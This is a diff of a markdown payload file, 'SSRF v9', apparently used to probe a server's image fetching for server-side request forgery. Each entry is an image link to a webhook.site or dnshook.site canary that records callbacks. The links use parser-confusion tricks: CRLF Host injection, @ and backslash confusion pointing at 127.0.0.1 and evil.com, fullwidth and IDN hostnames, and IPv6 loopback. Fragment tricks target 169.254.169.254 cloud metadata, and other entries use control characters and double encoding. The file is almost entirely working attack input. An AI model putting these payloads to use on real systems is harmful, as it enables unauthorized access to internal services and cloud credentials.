@@ -1,65 +1,63 @@
-# SSRF v9 - Hostname Injection & Edge Cases
+# SSRF v9 - Fresh Webhook - Hostname & Edge Cases
 
-## Hostname with CRLF (via user:pass@)
+## Basic Canary
 
-![u1](https://admin:pass%0d%0aHost:%20127.0.0.1@webhook.site/u1.gif)
+![canary](https://webhook.site/d498db94-9ba8-4b98-8192-09af3fe2cbb4/v9-canary.gif)
 
-![u2](https://user%0d%0aHost:%20internal:pass@webhook.site/u2.gif)
+## Hostname with Encoded Dot
 
-## Hostname with Encoded Characters
+![h1](https://webhook%2esite/d498db94-9ba8-4b98-8192-09af3fe2cbb4/h1-encoded-dot.gif)
 
-![h1](https://webhook%2esite/136e610f-df46-485b-b57e-d42604727ca2/h1.gif)
+## Fullwidth Characters
 
-![h2](https://webhook．site/136e610f-df46-485b-b57e-d42604727ca2/h2.gif)
+![fw1](https://webhook．site/d498db94-9ba8-4b98-8192-09af3fe2cbb4/fw1-fullwidth.gif)
 
-## @ Symbol Tricks
+## Fragment Tricks
 
-![at1](https://webhook.site@evil.com/136e610f-df46-485b-b57e-d42604727ca2/at1.gif)
+![frag1](https://webhook.site/d498db94-9ba8-4b98-8192-09af3fe2cbb4/frag1#@169.254.169.254.gif)
 
-![at2](https://evil.com%40webhook.site/136e610f-df46-485b-b57e-d42604727ca2/at2.gif)
+![frag2](https://webhook.site/d498db94-9ba8-4b98-8192-09af3fe2cbb4/frag2%23internal.gif)
 
-## Backslash Confusion
+## Port Variations
 
-![bs1](https://webhook.site\@127.0.0.1/136e610f-df46-485b-b57e-d42604727ca2/bs1.gif)
+![port80](https://webhook.site:80/d498db94-9ba8-4b98-8192-09af3fe2cbb4/port80.gif)
 
-![bs2](https://webhook.site%5c@127.0.0.1/bs2.gif)
+![port443](https://webhook.site:443/d498db94-9ba8-4b98-8192-09af3fe2cbb4/port443.gif)
 
-## IDN/Punycode Tests
+![port8080](https://webhook.site:8080/d498db94-9ba8-4b98-8192-09af3fe2cbb4/port8080.gif)
 
-![idn1](https://ⓦⓔⓑⓗⓞⓞⓚ.site/136e610f-df46-485b-b57e-d42604727ca2/idn1.gif)
+## Whitespace Chars
 
-## Fragment Identifier Tricks
+![tab](https://webhook.site/d498db94-9ba8-4b98-8192-09af3fe2cbb4/ws-tab%09test.gif)
 
-![frag1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/frag1#@169.254.169.254/latest/meta-data/.gif)
+![space](https://webhook.site/d498db94-9ba8-4b98-8192-09af3fe2cbb4/ws-space%20test.gif)
 
-![frag2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/frag2%23@internal/.gif)
+## Control Characters
 
-## Port Tricks
+![null](https://webhook.site/d498db94-9ba8-4b98-8192-09af3fe2cbb4/ctrl-null%00test.gif)
 
-![port1](https://webhook.site:80/136e610f-df46-485b-b57e-d42604727ca2/port1.gif)
+![bell](https://webhook.site/d498db94-9ba8-4b98-8192-09af3fe2cbb4/ctrl-bell%07test.gif)
 
-![port2](https://webhook.site:443/136e610f-df46-485b-b57e-d42604727ca2/port2.gif)
+![backspace](https://webhook.site/d498db94-9ba8-4b98-8192-09af3fe2cbb4/ctrl-bs%08test.gif)
 
-![port3](https://webhook.site:8080/136e610f-df46-485b-b57e-d42604727ca2/port3.gif)
+![formfeed](https://webhook.site/d498db94-9ba8-4b98-8192-09af3fe2cbb4/ctrl-ff%0ctest.gif)
 
-## IPv6 Tricks
+## Unicode Normalization
 
-![ipv1](https://[::ffff:7f00:1]/136e610f-df46-485b-b57e-d42604727ca2/ipv1.gif)
+![uni1](https://webhook.site/d498db94-9ba8-4b98-8192-09af3fe2cbb4/uni-ℍost.gif)
 
-## URL with Tab/Space
+![uni2](https://webhook.site/d498db94-9ba8-4b98-8192-09af3fe2cbb4/uni-ｈost.gif)
 
-![ws1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/ws1%09tab.gif)
+## Double Encoding
 
-![ws2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/ws2%20space.gif)
+![de1](https://webhook.site/d498db94-9ba8-4b98-8192-09af3fe2cbb4/de-%252e%252e.gif)
 
-## Basic v9 Canary
+![de2](https://webhook.site/d498db94-9ba8-4b98-8192-09af3fe2cbb4/de-%25%30d%25%30a.gif)
 
-![v9](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/v9-canary.gif)
+## DNS Canary v9
 
-## DNS Exfiltration v9
-
-![dns1](https://v9-hostname-test.136e610f-df46-485b-b57e-d42604727ca2.dnshook.site/dns1.gif)
+![dns1](https://v9-fresh.d498db94-9ba8-4b98-8192-09af3fe2cbb4.dnshook.site/dns1.gif)
 
 ---
 
-*v9: Hostname and edge case testing*
+*v9: Fresh webhook d498db94-9ba8-4b98-8192-09af3fe2cbb4*
